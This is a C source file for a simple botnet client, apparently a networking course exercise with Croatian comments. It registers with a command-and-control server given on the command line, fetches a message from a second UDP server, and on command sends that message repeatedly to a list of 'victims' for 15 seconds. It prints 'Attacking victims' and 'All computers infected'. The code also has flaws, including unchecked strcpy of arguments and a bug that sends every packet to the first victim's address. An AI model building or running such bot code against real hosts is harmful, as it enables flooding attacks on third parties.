#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <netdb.h>
#include <arpa/inet.h>

#define MAXLEN 512

int Socket (int family, int type, int proto) {
	int mySock;
	int errno;
	mySock = socket(family, type, proto);
	if (mySock<0) {
		fprintf(stderr, "Error: %s\n", strerror(errno));
		exit(1);
	} else {
		return mySock;
	}
}

void errorFunc (int e) {
	if(e<0){
		fprintf(stderr, "Error: %s\n", strerror(errno));
		exit(1);
	}
}

int main (int argc, char *argv[]) {
	char regmsg[10] = "REG\n";
	char hellomsg[10] = "HELLO\n";
	char msgfromudp[MAXLEN];
	char ccport[30];
	char ccip[30];
	struct addrinfo hints, *res;
	struct sockaddr_in ccaddr, udpaddr, infectedaddr;
	socklen_t cclen;
	socklen_t udplen = sizeof(udpaddr);
	int e, udpsock, tcpsock, i, j;
	udpaddr.sin_family = AF_INET;
	
	if (argc!=3) {
		fprintf(stderr, "Usage: ./bot server_ip server_port\n");
		exit(1);
	}
	
	//C&C
	strcpy(ccip, argv[1]);
	strcpy(ccport, argv[2]);
	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_flags = AI_CANONNAME;
	
	e = getaddrinfo(ccip, ccport, &hints, &res);
	errorFunc(e);
	
	ccaddr.sin_family = AF_INET;
	ccaddr = *((struct sockaddr_in*)res->ai_addr);
	cclen = sizeof(ccaddr);
	
	udpsock = Socket(PF_INET, SOCK_DGRAM, 0);
	
	struct INFO {
		char IP[INET_ADDRSTRLEN];
		char port[22];
	};
	
	struct MSG {
		char command;
		struct INFO info[22];
	};
	
	struct MSG received;
	
	printf("Sending REG to C&C server.\n");
	e = sendto(udpsock, regmsg, strlen(regmsg), 0, (struct sockaddr *)&ccaddr, cclen);
	errorFunc(e);
	printf("C&C is sending message.\n");
	
	while(1) {
		for (i=0; i<20; i++) {
			memset(&received.info[i].IP[0], 0, sizeof(received.info[i].IP));
			memset(&received.info[i].port[0], 0, sizeof(received.info[i].port));
		}
		e = recvfrom(udpsock, &received, MAXLEN, 0, (struct sockaddr *)&ccaddr, &cclen);
		errorFunc(e);
		
		if (received.command=='0'){
			inet_pton(AF_INET, &received.info[0].IP[0], &(udpaddr.sin_addr.s_addr));
			udpaddr.sin_port = htons(atoi(&received.info[0].port[0]));
		
			//posalji hello UDP serveru
			e = sendto(udpsock, hellomsg, strlen(hellomsg), 0, (struct sockaddr *)&udpaddr, udplen);
			errorFunc(e);
		
			printf("UDP server is sending messages.\n");
			e = recvfrom (udpsock, &msgfromudp, MAXLEN, 0, (struct sockaddr *)&udpaddr, &udplen);
			errorFunc(e);
			printf("Received message from UDP server.\n");		
		} else if (received.command=='1') {
			//salji poruke svim zrtavama 15 sekundi
			printf("Attacking victims.\n");
			for (j=0; j<15; j++){
				for (i=0; i<20; i++) {
					if(strcmp("", &(received.info[i].IP[0]))!=0){
						printf("Victim %d, IP: %s, PORT: %s\n", i, &received.info[i].IP[0], &received.info[i].port[0]);
						infectedaddr.sin_family = AF_INET;
						infectedaddr.sin_port = htons(atoi(&received.info[i].port[0]));
						inet_pton(AF_INET, &received.info[0].IP[0], &infectedaddr.sin_addr.s_addr);
						e=sendto(udpsock, &msgfromudp, strlen(msgfromudp), 0, (struct sockaddr *)&infectedaddr, sizeof(infectedaddr));
						errorFunc(e);
					} else {
						break;
					}
				}
				sleep(1);		
			}
			printf("All computers infected.\n");
		}
	}
	return 0;
}
